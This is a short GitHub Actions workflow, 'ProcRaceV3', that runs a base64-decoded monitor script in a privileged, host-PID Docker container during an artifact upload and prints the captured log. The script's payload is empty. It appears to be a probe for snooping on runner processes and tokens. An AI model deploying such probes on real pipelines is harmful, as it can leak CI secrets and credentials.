name: ProcRaceV3
on:
  push:
    branches: [main]
permissions:
  contents: read
  id-token: write

jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - name: Write monitor and start
        run: |
          echo "probe" > /tmp/probe.txt
          printf '%s' '' | base64 -d > /tmp/mon.sh
          chmod +x /tmp/mon.sh
          nohup docker run --rm --privileged --pid=host -v /tmp/mon.sh:/mon.sh:ro ubuntu:24.04 bash /mon.sh > /tmp/mon.log 2>&1 &
          echo $! > /tmp/bgpid.txt
          echo "Monitor started: $(cat /tmp/bgpid.txt)"
          sleep 3

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: probe-art
          path: /tmp/probe.txt

      - name: Read results
        run: |
          sleep 2
          kill $(cat /tmp/bgpid.txt) 2>/dev/null || true
          echo "=MON_LOG_START="
          cat /tmp/mon.log
          echo "=MON_LOG_END="
